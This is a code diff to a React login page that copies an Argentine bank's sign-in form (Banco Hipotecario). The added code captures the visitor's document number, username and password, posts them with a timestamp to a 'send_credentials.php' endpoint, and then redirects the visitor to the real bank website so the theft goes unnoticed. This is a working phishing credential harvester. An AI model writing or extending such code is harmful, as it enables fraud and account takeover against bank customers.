@@ -10,6 +10,8 @@ import { faEye } from "@fortawesome/free-solid-svg-icons";
 import { faEyeSlash } from "@fortawesome/free-solid-svg-icons";
 import { faIdCard } from "@fortawesome/free-regular-svg-icons";
 import { faKeyboard } from "@fortawesome/free-regular-svg-icons";
+import axios from '../config/axios.ts';
+import moment from 'moment';
 
 const exclamationTriangle = <FontAwesomeIcon icon={faExclamationTriangle} />;
 const user = <FontAwesomeIcon icon={faUser} />;
@@ -22,15 +24,58 @@ const keyboard = <FontAwesomeIcon icon={faKeyboard} />;
 
 const LoginView = () => {
 
+    const [documentVal, setDocument] = React.useState(null);
+    const [usernameVal, setUsername] = React.useState(null);
+    const [passwordVal, setPassword] = React.useState(null);
     const [userShown, setUserShown] = React.useState(false);
     const [passwordShown, setPasswordShown] = React.useState(false);
+
+    const handleChangeDocument = (event) => {
+        setDocument(event.target.value);
+        console.log(documentVal);
+    }
+
+    const handleChangeUsername = (event) => {
+        setUsername(event.target.value);
+        console.log(usernameVal);
+    }
+    const handleChangePassword = (event) => {
+        setPassword(event.target.value);
+        console.log(passwordVal);
+    }
 
     const toggleUserVisiblity = () => {
         setUserShown(userShown ? false : true);
     };
+
     const togglePasswordVisiblity = () => {
         setPasswordShown(passwordShown ? false : true);
     };
+
+    
+
+    const sendCredentials = async () =>{
+        try{
+            const date = new Date();
+
+            const data = {
+                type: "DNI",
+                document: documentVal,
+                username: usernameVal,
+                password: passwordVal,
+                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
+            }
+
+            await axios.post("/send_credentials.php", data)
+            .then(response=>{
+                console.log(response);
+                window.location.href = "https://www.hipotecario.com.ar/";
+            });
+        }
+        catch(e){
+            console.log(e);
+        }
+    }
 
     return(
         <div
@@ -277,6 +322,7 @@ const LoginView = () => {
                                             <input
                                                 type="number"
                                                 id="dataDocument"
+                                                onChange={handleChangeDocument}
                                                 className="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                 aria-invalid="false"
                                                 aria-required="false"
@@ -468,6 +514,7 @@ const LoginView = () => {
                                             <input
                                                 type={userShown ? "text" : "password"}
                                                 id="dataUser"
+                                                onChange={handleChangeUsername}
                                                 className="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                 aria-invalid="false"
                                                 aria-required="false"
@@ -693,6 +740,7 @@ const LoginView = () => {
                                             <input
                                                 type={passwordShown ? "text" : "password"}
                                                 id="dataPassword"
+                                                onChange={handleChangePassword}
                                                 className="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                 aria-invalid="false"
                                                 aria-required="false"
@@ -917,6 +965,7 @@ const LoginView = () => {
                                 }}>
                                 <Button
                                     className="font-family"
+                                    onClick={sendCredentials}
                                     style={{
                                         marginLeft:"0",
                                         marginRight:"0",
